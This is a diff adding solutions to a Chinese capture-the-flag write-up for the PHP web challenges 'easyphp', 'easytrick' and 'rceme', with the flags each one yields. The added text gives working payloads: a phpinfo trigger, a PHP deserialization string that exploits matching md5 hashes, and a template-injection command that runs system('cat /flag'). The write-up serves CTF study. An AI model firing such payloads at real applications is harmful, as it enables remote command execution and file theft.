@@ -1,5 +1,5 @@
 
-- 战队信息
+# 战队信息
 
 战队信息：JJU划水二队
 战队：406546	
@@ -264,6 +264,49 @@ flag{d3752538-90d0-c373-cfef-9247d3e16848}
 ```
 
 ## 题目编号19 题目名称easyphp
+
+>  fsockopen()函数的作用是可以用来打开一个socket连接，另一个函数pfsockopen()也有相似的功能，只不过后者是一个“持续”(persistent)的fsockopen()函数，它在脚本运行完之后并不立即断开。
+
+刚好对应提示**我fork出来进程怎么可能会异常退出。**
+
+于是构造`?a=pfsockopen`触发`phpinfo（）`函数
+在PHPINFO网页中搜寻flag
+
+`flag{475ab6fe-bea2-4182-b24a-720fe88f5fa3}`
+
+
+## 题目编号20 题目名称easytrick
+
+题目提示反序列化，尝试通过GET[trick]注入类，控制trick类内trick1变量和trick2变量
+
+```php
+        if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2){
+```
+而php对`2.0`和`2.000000000000000011111`的md5一样
+
+于是构造payload：`?trick=O:5:"trick":2:{s:6:"trick1";i:2;s:6:"trick2";d:2.0000000000000011111;}`
+
+得到`flag{cbbc1db8-4717-424e-9c16-dd595f55c4bd}`
+
+
+## 题目编号22 题目名称rceme
+
+根据
+```php
+function splits( $s, $str=',' ) {
+    if ( empty( $s ) ) return array( '' );
+    if ( strpos( $s, $str ) !== false ) {
+        return explode( $str, $s );
+    } else {
+        return array( $s );
+    }
+}
+```
+构造payload: ` /?a={if:('sys'.'tem')('cat /flag')}{end if}`
+
+
+得到:`flag{6b0bb879-8c77-4e07-b907-4531d832f075}`
+
 
 
 
